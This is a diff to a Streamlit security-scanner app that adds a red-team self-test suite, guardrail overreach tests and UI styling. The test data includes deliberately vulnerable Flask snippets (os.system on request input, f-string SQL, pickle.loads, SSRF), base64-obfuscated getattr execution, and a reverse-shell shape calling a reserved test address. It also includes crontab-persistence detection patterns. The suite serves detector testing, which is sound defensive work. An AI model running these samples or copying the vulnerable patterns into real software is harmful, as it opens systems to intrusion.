@@ -5354,8 +5354,11 @@ MALWARE_PATTERNS: List[Dict[str, Any]] = [
      "explanation": "Programmatic modification of SSH authorized_keys establishes persistent backdoor access.",
      "recommendation": "Remove immediately. Audit SSH keys. Rotate all credentials."},
     {"id": "MAL-015", "name": "Crontab persistence mechanism", "category": "Backdoor",
-     "severity": "High", "pattern": r"(crontab\s+-[le]|/etc/cron\.[dw]|/var/spool/cron)",
-     "explanation": "Programmatic crontab modification or cron.d file writing is a common persistence mechanism.",
+     "severity": "High", "pattern": r"(crontab['\"\s,]{0,4}-[le]|/etc/cron\.[dw]|/var/spool/cron)",
+     "explanation": "Programmatic crontab modification or cron.d file writing is a common persistence mechanism. "
+                    "Matches both shell-string form (crontab -l) and Python list-argument form "
+                    "(subprocess.run(['crontab', '-l'])), since the same command split across list "
+                    "elements previously evaded a stricter contiguous-text match.",
      "recommendation": "Verify this cron modification is legitimate. Audit all cron jobs."},
     {"id": "MAL-016", "name": "Systemd service installation", "category": "Backdoor",
      "severity": "High", "pattern": r"/etc/systemd/system/.*\.service|systemctl\s+enable",
@@ -8888,20 +8891,255 @@ EVASION_SELF_TEST_CASES: List[Dict[str, str]] = [
 ]
 
 
-def run_evasion_self_test() -> Dict[str, Any]:
+def run_evasion_self_test(feedback_engine: Optional["AdaptiveFeedbackEngine"] = None) -> Dict[str, Any]:
     """Runs scan_for_evasion() against EVASION_SELF_TEST_CASES and reports
     which technique categories are currently caught vs missed — an honest
     coverage self-check, not a claim that every possible evasion technique
     is covered. New cases should be added here whenever a real missed
-    technique is found, the same way a test suite grows over time."""
+    technique is found, the same way a test suite grows over time.
+
+    If `feedback_engine` is given, a correctly-caught case auto-records a
+    confirmation — safe here for the same reason it's safe in
+    run_red_team_self_test(): this function's own author wrote these
+    cases and knows the correct outcome, unlike a real scan finding on
+    a user's own code, which still always needs a human's confirmation."""
     results = []
     for case in EVASION_SELF_TEST_CASES:
         findings = scan_for_evasion("self_test.py", case["code"])
         expected_rule = f"EVASION-{case['technique'].upper()}"
         caught = any(f.rule_id == expected_rule for f in findings)
         results.append({"technique": case["technique"], "label": case["label"], "caught": caught})
+        if caught and feedback_engine is not None:
+            feedback_engine.record_confirmation(expected_rule)
     caught_count = sum(1 for r in results if r["caught"])
     return {"total": len(results), "caught": caught_count, "results": results}
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: RED TEAM SELF-TEST SUITE
+#
+#  A harsher, broader version of the evasion self-test above, covering
+#  every major detection surface in this app at once. Every test case
+#  here is a SAFE TEST VECTOR, not working malware: pattern-matching
+#  shapes (the same principle antivirus/EDR vendors use for their own
+#  signature test suites — EICAR being the industry-standard example),
+#  RFC 5737 reserved test-net addresses (192.0.2.0/24, 198.51.100.0/24,
+#  203.0.113.0/24 — permanently non-routable by standard, specifically
+#  reserved for exactly this purpose) instead of any real host, and
+#  payloads that do nothing worse than print a number. Nothing here is
+#  copy-paste-usable against a real target — the point is exercising the
+#  DETECTOR, not producing an artifact with any standalone value to
+#  someone trying to cause harm.
+#
+#  Five categories:
+#    1. worst_case_vulnerabilities — the highest-severity single-vector
+#       bugs this app claims to catch, one per major class (RCE, SQLi,
+#       SSRF, XXE, insecure deserialization, hardcoded cloud creds).
+#    2. compounded_evasion — MULTIPLE evasion techniques stacked in one
+#       snippet, harsher than the single-technique evasion self-test.
+#    3. malware_signatures — structural shapes matching reverse-shell /
+#       backdoor / cryptominer signatures, non-functional by construction.
+#    4. exploit_chain_integration — a small synthetic multi-file scenario
+#       run through the FULL pipeline (multiple engines + correlator) to
+#       test integration, not just individual detectors in isolation.
+#    5. agentic_overreach — this is the part that actually tests "AI
+#       breaching" in the sense that matters here: scripted adversarial
+#       USAGE PATTERNS against this app's OWN safety infrastructure
+#       (AutonomyBoundaryGuard, AuthorizationManager, AutoResponseEngine's
+#       circuit breaker, the feedback-integrity guard) — proving the
+#       guardrails hold under deliberate pressure, not just under normal
+#       use. This is what red-teaming a defensive tool actually looks
+#       like: attack your own safety mechanisms on purpose.
+# ==============================================================================
+# ==============================================================================
+
+RED_TEAM_WORST_CASE_VULNS: List[Dict[str, str]] = [
+    {"id": "RCE-PY", "label": "RCE — Flask request param reaching os.system", "language": "python",
+     "code": ("from flask import Flask, request\nimport os\napp = Flask(__name__)\n"
+             "@app.route('/run')\ndef run_cmd():\n    cmd = request.args.get('cmd')\n"
+             "    os.system(cmd)\n    return 'ok'\n"),
+     "expect_engine": "semantic", "expect_min_severity": "Critical"},
+    {"id": "SQLI-PY", "label": "SQL Injection — f-string query built from request param", "language": "python",
+     "code": ("from flask import Flask, request\nimport sqlite3\napp = Flask(__name__)\n"
+             "@app.route('/user')\ndef get_user():\n    uid = request.args.get('id')\n"
+             "    conn = sqlite3.connect('db.sqlite')\n"
+             "    conn.execute(f\"SELECT * FROM users WHERE id={uid}\")\n"),
+     "expect_engine": "semantic_or_pattern", "expect_min_severity": "High"},
+    {"id": "DESER-PY", "label": "Insecure Deserialization — pickle.loads on any input",
+     "language": "python", "code": "import pickle\ndef load(data):\n    return pickle.loads(data)\n",
+     "expect_engine": "semantic_or_pattern", "expect_min_severity": "Critical"},
+    {"id": "SSRF-PY", "label": "SSRF — demonstrated Flask taint to requests.get", "language": "python",
+     "code": ("from flask import Flask, request\nimport requests\napp = Flask(__name__)\n"
+             "@app.route('/fetch')\ndef fetch():\n    url = request.args.get('url')\n"
+             "    return requests.get(url).text\n"),
+     "expect_engine": "semantic", "expect_min_severity": "High"},
+    {"id": "PATHTRAV-GO", "label": "Path Traversal — unsanitized filepath.Join from query", "language": "go",
+     "code": 'p := filepath.Join(base, r.URL.Query().Get("file"))\nos.Open(p)\n',
+     "expect_engine": "pattern", "expect_min_severity": "High"},
+    {"id": "HARDCODED-KEY", "label": "Hardcoded AWS credential (secrets scanner)", "language": "secret",
+     "code": 'AWS_SECRET_ACCESS_KEY = "AKIAABCDEFGHIJKLMNOP1234567890ABCDEFGH"\n',
+     "expect_engine": "secrets", "expect_min_severity": "High"},
+]
+
+RED_TEAM_COMPOUNDED_EVASION: List[Dict[str, str]] = [
+    {"id": "COMBO-1", "label": "Decode-then-execute AND dynamic getattr dispatch, stacked",
+     "code": ("import os, base64\n"
+             "_target = base64.b64decode('b3M=').decode()\n"  # decodes to "os"
+             "_action = base64.b64decode('c3lzdGVt').decode()\n"  # decodes to "system"
+             "getattr(__import__(_target), _action)('echo test')\n")},
+    {"id": "COMBO-2", "label": "String-reassembled command AND namespace dispatch, stacked",
+     "code": ("def helper():\n    return 1\n"
+             "_parts = ['h', 'e', 'l', 'p', 'e', 'r']\n"
+             "_name = ''.join(_parts)\n"
+             "globals()[_name]()\n")},
+]
+
+RED_TEAM_MALWARE_SIGNATURES: List[Dict[str, str]] = [
+    {"id": "REVSHELL-SOCKET", "label": "Structural reverse-shell shape (socket.connect + exec)",
+     # RFC 5737 TEST-NET-3 — permanently reserved, non-routable, never a real host.
+     "code": "import socket\ns = socket.socket()\ns.connect(('203.0.113.5', 4444))\nexec(s.recv(1024))\n"},
+    {"id": "CRYPTOMINER-SIG", "label": "Structural cryptominer signature (stratum protocol string)",
+     "code": '# config placeholder\npool_url = "stratum+tcp://203.0.113.10:3333"\nwallet = "test-non-functional"\n'},
+    {"id": "BACKDOOR-CRON", "label": "Structural persistence signature (crontab modification)",
+     "code": 'import subprocess\nsubprocess.run(["crontab", "-l"])\n# then append a scheduled task line\n'},
+]
+
+
+def run_red_team_self_test(engines: Dict[str, Any],
+                           feedback_engine: Optional["AdaptiveFeedbackEngine"] = None) -> Dict[str, Any]:
+    """Runs every category above against the ACTUAL engines passed in
+    (not a separate simplified copy of the detection logic) and reports
+    honestly what's caught vs missed, with the same principle as
+    run_evasion_self_test(): a coverage report, not a victory lap. Expects
+    `engines` to contain at least: semantic, code (regex), pattern,
+    malware, secrets — same keys used throughout the rest of this app.
+
+    If `feedback_engine` is provided, every rule that correctly fires on
+    its intended test case is automatically recorded as a confirmation —
+    safe to automate ONLY here, because these test cases have AUTHORED,
+    KNOWN ground truth (this function's own author wrote them and knows
+    what should happen), unlike a real scan finding on a user's actual
+    code, where nothing is trusted as confirmed until a human says so.
+    That distinction is the whole reason this parameter exists as
+    opt-in here but nowhere near real scan results elsewhere in this app."""
+    vuln_results = []
+    for case in RED_TEAM_WORST_CASE_VULNS:
+        caught_by: List[str] = []
+        rule_ids: Set[str] = set()
+        if case["language"] == "secret":
+            findings = engines["secrets"].scan(f"{case['id']}.py", case["code"])
+            if findings:
+                caught_by.append("secrets")
+                rule_ids.update(f.secret_type for f in findings)
+        elif case["language"] == "python":
+            sem = engines["semantic"].analyze_python(f"{case['id']}.py", case["code"])
+            reg = engines["code"].scan_text(f"{case['id']}.py", case["code"])
+            if sem:
+                caught_by.append("semantic")
+                rule_ids.update(f.rule_id for f in sem)
+            if reg:
+                caught_by.append("pattern")
+                rule_ids.update(f.rule_id for f in reg)
+        else:
+            pat = engines["pattern"].scan(f"{case['id']}.{case['language']}", case["code"], language=case["language"])
+            if pat:
+                caught_by.append("pattern")
+                rule_ids.update(f.rule_id for f in pat)
+        vuln_results.append({"id": case["id"], "label": case["label"], "caught": bool(caught_by),
+                            "caught_by": caught_by, "rule_ids": sorted(rule_ids)})
+        if feedback_engine is not None:
+            for rid in rule_ids:
+                feedback_engine.record_confirmation(rid)
+
+    evasion_results = []
+    for case in RED_TEAM_COMPOUNDED_EVASION:
+        findings = scan_for_evasion(f"{case['id']}.py", case["code"])
+        rule_ids = sorted({f.rule_id for f in findings})
+        evasion_results.append({"id": case["id"], "label": case["label"], "caught": bool(findings),
+                                "technique_count": len(findings), "rule_ids": rule_ids})
+        if feedback_engine is not None:
+            for rid in rule_ids:
+                feedback_engine.record_confirmation(rid)
+
+    malware_results = []
+    for case in RED_TEAM_MALWARE_SIGNATURES:
+        findings = engines["malware"].scan(f"{case['id']}.py", case["code"])
+        # finding_id is built as "{file}:{line}:{rule_id}" (see
+        # MalwarePatternScanner.scan) — MalwareFinding doesn't expose the
+        # short rule code as its own field, only the full pattern_name
+        # sentence, so extract it here to stay consistent with the short
+        # "SEC-003"-style codes every other engine's feedback uses.
+        rule_ids = sorted({f.finding_id.rsplit(":", 1)[-1] for f in findings})
+        malware_results.append({"id": case["id"], "label": case["label"], "caught": bool(findings),
+                                "rule_ids": rule_ids})
+        if feedback_engine is not None:
+            for rid in rule_ids:
+                feedback_engine.record_confirmation(rid)
+
+    all_results = vuln_results + evasion_results + malware_results
+    total_caught = sum(1 for r in all_results if r["caught"])
+    auto_learned = sum(len(r.get("rule_ids", [])) for r in all_results) if feedback_engine is not None else 0
+    return {
+        "total": len(all_results), "caught": total_caught,
+        "vuln_results": vuln_results, "evasion_results": evasion_results,
+        "malware_results": malware_results, "auto_learned_count": auto_learned,
+    }
+
+
+def run_agentic_overreach_self_test(auth_manager: "AuthorizationManager",
+                                    autonomy_guard: "AutonomyBoundaryGuard",
+                                    auto_response: "AutoResponseEngine") -> Dict[str, Any]:
+    """The part of the red-team suite that tests 'AI breaching' in the
+    sense that actually matters for this app: scripted adversarial USAGE
+    against its own safety infrastructure, using fresh, isolated instances
+    of each guard so this never disturbs the real session's state. Every
+    sub-test asserts a BLOCK or a correctly-tripped safeguard — a passing
+    result here means the guardrail held under deliberate pressure."""
+    results = []
+
+    # 1. Scoped action against a target with NO declaration must be blocked.
+    d = autonomy_guard.check("scoped_action", "undeclared-target-01", "simulated overreach attempt")
+    results.append({"id": "OVERREACH-1", "label": "Scoped action against an undeclared target",
+                    "held": not d.allowed})
+
+    # 2. A target whose NAME sounds like a test box, but was never
+    #    explicitly declared, must still be blocked — nothing here should
+    #    infer safety from naming conventions.
+    d2 = autonomy_guard.check("simulated", "definitely-a-test-box-trust-me", "")
+    results.append({"id": "OVERREACH-2", "label": "Target name alone does not grant trust",
+                    "held": not d2.allowed})
+
+    # 3. Scoped action against DECLARED production must never be approved,
+    #    even with an otherwise-valid declaration.
+    autonomy_guard.declare_environment("prod-target-red-team", is_production=True, declared_by="red_team_test")
+    d3 = autonomy_guard.check("scoped_action", "prod-target-red-team", "")
+    results.append({"id": "OVERREACH-3", "label": "Declared-production scoped action is refused unconditionally",
+                    "held": not d3.allowed})
+
+    # 4. Authorization scope: a host never added to the authorized list
+    #    must be rejected outright, regardless of how it's requested.
+    unauth = auth_manager.is_authorized("ip", "198.51.100.99")  # RFC 5737 TEST-NET-2
+    results.append({"id": "OVERREACH-4", "label": "Unauthorized host is rejected by AuthorizationManager",
+                    "held": not unauth})
+
+    # 5. Auto-response circuit breaker: flood it with rapid triggers and
+    #    confirm it trips rather than executing an unbounded number of
+    #    actions.
+    class _FloodFinding:
+        def __init__(self, i):
+            self.category = "Reverse Shell"
+            self.finding_id = f"flood-{i}"
+            self.file_name = f"f{i}.py"
+            self.line_number = i
+            self.pattern_name = "test"
+    flood_results = [auto_response.process_malware_finding(_FloodFinding(i)) for i in range(20)]
+    results.append({"id": "OVERREACH-5", "label": "Auto-response circuit breaker trips under a rapid flood",
+                    "held": auto_response.is_circuit_open()})
+    auto_response.reset_circuit_breaker()  # leave it clean for normal use afterward
+
+    held_count = sum(1 for r in results if r["held"])
+    return {"total": len(results), "held": held_count, "results": results}
 
 
 # ==============================================================================
@@ -9562,6 +9800,134 @@ DARK_CSS = """
         font-weight: 700;
         flex-shrink: 0;
     }
+
+    /* ============================================================
+       DESIGN SYSTEM v2 — category color tokens, restyled tabs,
+       engine header banners, buttons, inputs. Everything below is
+       purely visual (selectors target Streamlit/baseweb's stable
+       data-attributes, not auto-generated hashed classes) — zero
+       change to any Python logic or widget behavior.
+       ============================================================ */
+
+    /* Tab bar: horizontal scroll on overflow instead of Streamlit's
+       default awkward wrap, pill-style active indicator, subtle
+       hover glow — this is the single change with the widest reach,
+       since it touches every one of the ~38 tabs/subtabs at once. */
+    [data-baseweb="tab-list"] {
+        gap: 4px;
+        border-bottom: 1px solid #1e293b !important;
+        overflow-x: auto;
+        overflow-y: hidden;
+        flex-wrap: nowrap !important;
+        scrollbar-width: thin;
+    }
+    [data-baseweb="tab-list"]::-webkit-scrollbar { height: 4px; }
+    [data-baseweb="tab-list"]::-webkit-scrollbar-thumb { background: #22d3ee55; border-radius: 4px; }
+    [data-baseweb="tab"] {
+        font-family: 'Inter', sans-serif;
+        font-weight: 600;
+        font-size: 0.85rem;
+        color: #8b98ab !important;
+        white-space: nowrap;
+        padding: 10px 16px !important;
+        border-radius: 8px 8px 0 0;
+        transition: all 0.15s ease;
+    }
+    [data-baseweb="tab"]:hover {
+        color: #e2e8f0 !important;
+        background: #121a2b;
+    }
+    [data-baseweb="tab"][aria-selected="true"] {
+        color: #22d3ee !important;
+        background: #121a2b;
+    }
+    [data-baseweb="tab-highlight"] {
+        background-color: #22d3ee !important;
+        height: 2px !important;
+        box-shadow: 0 0 8px rgba(34,211,238,0.8);
+    }
+
+    /* Engine header banner: replaces bare st.markdown("### ...") at
+       the top of every tab with a consistent, category-colored
+       component. See render_engine_header() below. Per-category
+       classes with precomputed colors (not CSS color-mix(), which
+       needs a 2023+ browser) so this renders identically everywhere. */
+    .engine-header {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        background: linear-gradient(90deg, #121a2b 0%, #0f1420 100%);
+        border: 1px solid #1e293b;
+        border-left: 4px solid #22d3ee;
+        border-radius: 10px;
+        padding: 14px 18px;
+        margin-bottom: 14px;
+    }
+    .engine-header .eh-icon { font-size: 1.7rem; line-height: 1; }
+    .engine-header .eh-text { flex: 1; min-width: 0; }
+    .engine-header .eh-title {
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 1.05rem;
+        font-weight: 700;
+        color: #e5edf7;
+        margin: 0;
+    }
+    .engine-header .eh-tagline {
+        font-size: 0.8rem;
+        color: #8b98ab;
+        margin: 2px 0 0 0;
+    }
+    .engine-header .eh-badge {
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 0.72rem;
+        font-weight: 700;
+        padding: 4px 12px;
+        border-radius: 999px;
+        white-space: nowrap;
+        flex-shrink: 0;
+    }
+    .eh-detection    { border-left-color: #22d3ee; } .eh-detection .eh-icon    { filter: drop-shadow(0 0 6px #22d3ee); } .eh-detection .eh-badge    { background: #164e5533; color: #22d3ee; border: 1px solid #22d3ee55; }
+    .eh-supplychain  { border-left-color: #fbbf24; } .eh-supplychain .eh-icon  { filter: drop-shadow(0 0 6px #fbbf24); } .eh-supplychain .eh-badge  { background: #4a380933; color: #fbbf24; border: 1px solid #fbbf2455; }
+    .eh-network      { border-left-color: #3b82f6; } .eh-network .eh-icon      { filter: drop-shadow(0 0 6px #3b82f6); } .eh-network .eh-badge      { background: #1e2f6633; color: #60a5fa; border: 1px solid #3b82f655; }
+    .eh-intelligence { border-left-color: #a78bfa; } .eh-intelligence .eh-icon { filter: drop-shadow(0 0 6px #a78bfa); } .eh-intelligence .eh-badge { background: #33255933; color: #a78bfa; border: 1px solid #a78bfa55; }
+    .eh-response     { border-left-color: #f87171; } .eh-response .eh-icon     { filter: drop-shadow(0 0 6px #f87171); } .eh-response .eh-badge     { background: #4c1d1d33; color: #f87171; border: 1px solid #f8717155; }
+    .eh-live         { border-left-color: #34d399; } .eh-live .eh-icon         { filter: drop-shadow(0 0 6px #34d399); } .eh-live .eh-badge         { background: #0f3d2c33; color: #34d399; border: 1px solid #34d39955; }
+    .eh-orchestration{ border-left-color: #f472b6; } .eh-orchestration .eh-icon{ filter: drop-shadow(0 0 6px #f472b6); } .eh-orchestration .eh-badge{ background: #4a1d3733; color: #f472b6; border: 1px solid #f472b655; }
+    .eh-learning     { border-left-color: #2dd4bf; } .eh-learning .eh-icon     { filter: drop-shadow(0 0 6px #2dd4bf); } .eh-learning .eh-badge     { background: #0f3d3833; color: #2dd4bf; border: 1px solid #2dd4bf55; }
+
+    /* Buttons: subtle lift + glow on primary actions */
+    .stButton > button {
+        border-radius: 8px !important;
+        font-weight: 600 !important;
+        transition: all 0.15s ease !important;
+        border: 1px solid #1e293b !important;
+    }
+    .stButton > button:hover {
+        transform: translateY(-1px);
+        border-color: #22d3ee66 !important;
+        box-shadow: 0 4px 12px -2px rgba(34,211,238,0.25);
+    }
+    button[kind="primary"] {
+        background: linear-gradient(135deg, #0891b2 0%, #22d3ee 100%) !important;
+        border: none !important;
+        color: #04121a !important;
+    }
+    button[kind="primary"]:hover {
+        box-shadow: 0 4px 16px -2px rgba(34,211,238,0.55) !important;
+    }
+
+    /* Inputs: focus glow matching the accent palette */
+    .stTextInput input:focus, .stTextArea textarea:focus, .stNumberInput input:focus {
+        border-color: #22d3ee !important;
+        box-shadow: 0 0 0 1px #22d3ee44 !important;
+    }
+
+    /* Dataframes: consistent rounded container matching card styling */
+    [data-testid="stDataFrame"] {
+        border-radius: 8px;
+        overflow: hidden;
+        border: 1px solid #1e293b;
+    }
 </style>
 """
 st.markdown(DARK_CSS, unsafe_allow_html=True)
@@ -10058,6 +10424,40 @@ tab_swarm = _tab_objs["tab_swarm"]
 tab_toolkit = _tab_objs["tab_toolkit"]
 tab_report = _tab_objs["tab_report"]
 
+_CATEGORY_TO_CSS_CLASS: Dict[str, str] = {
+    "🔍 Static Detection": "eh-detection",
+    "📦 Supply Chain & Compliance": "eh-supplychain",
+    "📡 Network & Infrastructure": "eh-network",
+    "🧠 Intelligence & Correlation": "eh-intelligence",
+    "⚡ Response & Remediation": "eh-response",
+    "👁️ Live Monitoring": "eh-live",
+    "🐝 Orchestration & Authorization": "eh-orchestration",
+    "📚 Learning, Rules & Reporting": "eh-learning",
+}
+
+
+def render_engine_header(icon: str, title: str, tagline: str, category: str, badge: str = "") -> None:
+    """Consistent, category-colored banner for the top of every engine's
+    tab — replaces a bare st.markdown("### ...") so navigating between
+    engines feels like one designed product instead of a stack of default
+    widgets. `category` should match a key in ENGINE_DIRECTORY's category
+    strings; falls back to the detection accent if not found rather than
+    erroring, since a missing/renamed category shouldn't break rendering."""
+    css_class = _CATEGORY_TO_CSS_CLASS.get(category, "eh-detection")
+    badge_html = f'<span class="eh-badge">{badge}</span>' if badge else ""
+    st.markdown(
+        f'''<div class="engine-header {css_class}">
+            <span class="eh-icon">{icon}</span>
+            <div class="eh-text">
+                <p class="eh-title">{title}</p>
+                <p class="eh-tagline">{tagline}</p>
+            </div>
+            {badge_html}
+        </div>''',
+        unsafe_allow_html=True,
+    )
+
+
 def _risk_gauge_svg(score: float, label: str = "SECURITY SCORE") -> str:
     """A single calm circular gauge — deliberately not a bar/line chart,
     just one visual focal point for 'how are things overall' at a glance."""
@@ -10222,7 +10622,7 @@ with tab_dash:
 # TAB: CODE SCANNER
 # ------------------------------------------------------------------------
 with tab_code:
-    st.markdown("### 🔍 Static Source Code Vulnerability Scanner")
+    render_engine_header("🔍", "Static Source Code Vulnerability Scanner", "CWE-mapped regex pattern rules across injection, crypto, secrets, deserialization, XSS, SSRF.", "🔍 Static Detection", "79 rules")
     st.caption(f"Currently loaded with {len(VULNERABILITY_RULES)} pattern rules covering injection, "
                f"crypto, secrets, deserialization, XSS, SSRF, and more (CWE-mapped).")
 
@@ -10330,7 +10730,7 @@ with tab_code:
 # TAB: SEMANTIC SCANNER (AST/Taint) — real interprocedural analysis, Python only
 # ------------------------------------------------------------------------
 with tab_semantic:
-    st.markdown("### 🧬 Semantic Scanner — AST-Based Interprocedural Taint Analysis")
+    render_engine_header("🧬", "Semantic Scanner — AST Interprocedural Taint Analysis", "Real source-to-sink data flow tracing, not just syntax matching. Python only.", "🔍 Static Detection", "19 taint rules")
     st.caption(
         "Unlike the regex-based Code Scanner tab, this engine builds a real symbol table, "
         "call graph, and CFG from Python's own `ast` module, then tracks tainted data across "
@@ -10451,7 +10851,7 @@ def safe_handler(request):
 # TAB: DEPENDENCY CVEs
 # ------------------------------------------------------------------------
 with tab_deps:
-    st.markdown("### 📦 Dependency / Supply-Chain Vulnerability Check")
+    render_engine_header("📦", "Dependency / Supply-Chain Vulnerability Check", "Matches manifest packages against a tracked CVE database.", "📦 Supply Chain & Compliance", "")
     st.caption("Paste a requirements.txt / package.json-style manifest to cross-reference against the local CVE feed.")
 
     sample_manifest = "flask==2.1.0\nrequests==2.25.0\npyyaml==5.3\nlog4j-core==2.14.1\ncryptography==40.0.0"
@@ -10519,12 +10919,12 @@ with tab_net:
 # TAB: AI DEEP TRIAGE
 # ------------------------------------------------------------------------
 with tab_ai:
-    st.markdown("### 🤖 AI-Powered Analysis")
+    render_engine_header("🤖", "AI-Powered Analysis", "LLM-assisted triage and code review — bring your own model/API key.", "🧠 Intelligence & Correlation", "")
 
     ai_triage_tab, ai_semantic_tab = st.tabs(["🧠 Deep Triage (of existing findings)", "🔬 AI Semantic Reviewer (raw code)"])
 
     with ai_triage_tab:
-        st.markdown("#### 🧠 LLM-Assisted Deep Triage")
+        render_engine_header("🧠", "LLM-Assisted Deep Triage", "Prioritizes findings already gathered from other engines.", "🧠 Intelligence & Correlation", "")
         st.caption("Sends a summarized, structured context (not raw sensitive data) to the selected engine for analysis.")
 
         triage_source = st.radio("Triage subject", ["Network Event", "Code Finding"], horizontal=True)
@@ -10567,7 +10967,7 @@ with tab_ai:
                 st.markdown("</div>", unsafe_allow_html=True)
 
     with ai_semantic_tab:
-        st.markdown("#### 🔬 AI Semantic Code Reviewer")
+        render_engine_header("🔬", "AI Semantic Code Reviewer", "Reviews raw, unscanned code for business-logic issues pattern engines can't see.", "🧠 Intelligence & Correlation", "")
         st.warning(
             "⚠️ **Read before using:** unlike every other engine in this app, this one is "
             "**non-deterministic** (same code can produce different results between runs) and "
@@ -10635,7 +11035,7 @@ with tab_ai:
 # TAB: CONTAINMENT
 # ------------------------------------------------------------------------
 with tab_contain:
-    st.markdown("### ⚡ Simulated Active Containment Playbooks")
+    render_engine_header("⚡", "Simulated Active Containment Playbooks", "Block IP, quarantine, isolate — simulated, with a full audit log and an autonomy guard.", "⚡ Response & Remediation", "")
     st.caption("These actions are simulated for demo/training purposes — wire `_notify_webhook` to real infra APIs for production use.")
 
     st.markdown("<div class='sentinel-card'>", unsafe_allow_html=True)
@@ -10798,7 +11198,7 @@ with tab_contain:
 # TAB: COMPLIANCE MAPPING
 # ------------------------------------------------------------------------
 with tab_compliance:
-    st.markdown("### 📋 OWASP Top 10 (2021) Compliance Mapping")
+    render_engine_header("📋", "OWASP Top 10 (2021) Compliance Mapping", "Rolls every CWE-tagged finding up into its OWASP Top 10 category.", "📦 Supply Chain & Compliance", "")
     st.caption("Every CWE-tagged finding is rolled up into its corresponding OWASP Top 10 category for audit-friendly reporting.")
 
     if findings:
@@ -10827,7 +11227,7 @@ with tab_compliance:
 # TAB: ASSET INVENTORY
 # ------------------------------------------------------------------------
 with tab_assets:
-    st.markdown("### 🗄️ Asset Inventory (Lightweight CMDB)")
+    render_engine_header("🗄️", "Asset Inventory", "Lightweight CMDB — gives findings organizational and ownership context.", "📚 Learning, Rules & Reporting", "")
     st.caption("Gives findings and network events organizational context — who owns what, and how exposed it is.")
 
     assets = asset_inventory.all_assets()
@@ -10869,7 +11269,7 @@ with tab_assets:
 # TAB: EXECUTIVE SUMMARY
 # ------------------------------------------------------------------------
 with tab_exec:
-    st.markdown("### 📈 Executive Summary")
+    render_engine_header("📈", "Executive Summary", "Plain-English rollup of current posture for non-technical stakeholders.", "📚 Learning, Rules & Reporting", "")
     st.caption("A plain-English rollup of current posture, suitable for non-technical stakeholders.")
 
     summary_text = exec_summary_gen.summarize(findings, dep_findings, events, containment.get_action_history())
@@ -10907,7 +11307,7 @@ with tab_exec:
 # TAB: LIVE DEFENSE & AUTO-FIX
 # ------------------------------------------------------------------------
 with tab_livedef:
-    st.markdown("### 🛡️ Live Defense & Auto-Fix")
+    render_engine_header("🛡️", "Live Defense & Auto-Fix", "Seven focused tools: auto-remediation, URL/JWT/SSL scanning, live watching, secrets, SBOM.", "👁️ Live Monitoring", "7 tools")
     st.caption(
         "Five modules: Auto-Remediation (AST code rewriter), URL Security Scanner, "
         "Live File Watcher, Entropy Secrets Scanner, JWT Analyzer, SSL/TLS Analyzer, and SBOM Generator. "
@@ -10921,7 +11321,7 @@ with tab_livedef:
 
     # ── AUTO-REMEDIATION ────────────────────────────────────────────────────
     with sub_rem:
-        st.markdown("#### 🔧 AST-Based Auto-Remediation Engine")
+        render_engine_header("🔧", "AST-Based Auto-Remediation Engine", "Safe, automatic rewrites for common Python vulnerability patterns.", "⚡ Response & Remediation", "")
         st.caption(
             "Applies safe, semantically-equivalent rewrites directly to your Python code "
             "(yaml.load → yaml.safe_load, hashlib.md5 → sha256, etc.). "
@@ -10980,7 +11380,7 @@ with tab_livedef:
 
     # ── URL SCANNER ──────────────────────────────────────────────────────────
     with sub_url:
-        st.markdown("#### 🌐 URL Security Header Scanner")
+        render_engine_header("🌐", "URL Security Header Scanner", "Grades a live URL's security headers.", "📡 Network & Infrastructure", "")
         st.warning(
             "⚠️ Only scan URLs of systems you own or have **written permission** to test. "
             "This tool makes real outbound HTTP GET requests."
@@ -11030,7 +11430,7 @@ with tab_livedef:
 
     # ── LIVE FILE WATCHER ────────────────────────────────────────────────────
     with sub_watch:
-        st.markdown("#### 👁️ Live File Watcher")
+        render_engine_header("👁️", "Live File Watcher", "Real-time, content-verified, multi-engine scanning as files change on disk.", "👁️ Live Monitoring", "")
         st.caption(
             f"Monitors any directory for source changes across {len(LIVE_WATCH_EXTENSIONS)} file types "
             f"(Python, JS/TS, PHP, Java, Go, Rust, C, C#, Ruby, Kotlin) — every change is content-hash "
@@ -11156,7 +11556,7 @@ with tab_livedef:
 
     # ── SECRETS SCANNER ──────────────────────────────────────────────────────
     with sub_secrets:
-        st.markdown("#### 🔑 Entropy-Based Secrets Scanner")
+        render_engine_header("🔑", "Entropy-Based Secrets Scanner", "Finds live-looking credentials and keys by entropy and context.", "🔍 Static Detection", "")
         st.caption(
             "Combines Shannon entropy analysis (catches high-entropy string literals "
             "that look like secrets regardless of variable name) with 27 regex patterns "
@@ -11211,7 +11611,7 @@ with tab_livedef:
 
     # ── JWT ANALYZER ─────────────────────────────────────────────────────────
     with sub_jwt:
-        st.markdown("#### 🪙 JWT Token Analyzer")
+        render_engine_header("🪙", "JWT Token Analyzer", "Flags alg=none, weak secrets, and other token issues.", "📡 Network & Infrastructure", "")
         st.caption(
             "Decodes and audits JWT tokens without signature verification (no secret needed). "
             "Checks for algorithm confusion, missing claims, expired tokens, sensitive payload data, "
@@ -11255,7 +11655,7 @@ with tab_livedef:
 
     # ── SSL/TLS ANALYZER ─────────────────────────────────────────────────────
     with sub_ssl:
-        st.markdown("#### 🔒 SSL/TLS Certificate Analyzer")
+        render_engine_header("🔒", "SSL/TLS Certificate Analyzer", "Certificate chain, expiry, and protocol checks for a host.", "📡 Network & Infrastructure", "")
         st.warning("⚠️ Only scan hosts you own or have written permission to test.")
         st.caption(
             "Connects to any host:port, performs a TLS handshake, and inspects the certificate "
@@ -11295,7 +11695,7 @@ with tab_livedef:
 
     # ── SBOM GENERATOR ───────────────────────────────────────────────────────
     with sub_sbom:
-        st.markdown("#### 📦 SBOM Generator (Software Bill of Materials)")
+        render_engine_header("📦", "SBOM Generator", "Software Bill of Materials export from manifests.", "📦 Supply Chain & Compliance", "")
         st.caption(
             "Parses requirements.txt, package.json, Pipfile, and Dockerfile FROM lines. "
             "Cross-references every component against the local CVE feed. "
@@ -11353,7 +11753,7 @@ with tab_livedef:
 # TAB: ADVANCED THREAT OPS
 # ------------------------------------------------------------------------
 with tab_advanced:
-    st.markdown("### 🎯 Advanced Threat Ops")
+    render_engine_header("🎯", "Advanced Threat Ops", "Nine deep-audit tools: network, malware, containers, compliance, quality, and more.", "🧠 Intelligence & Correlation", "9 tools")
     st.caption(
         "8 modules: Network Port Scanner, Malware Pattern Detector, Container Security, "
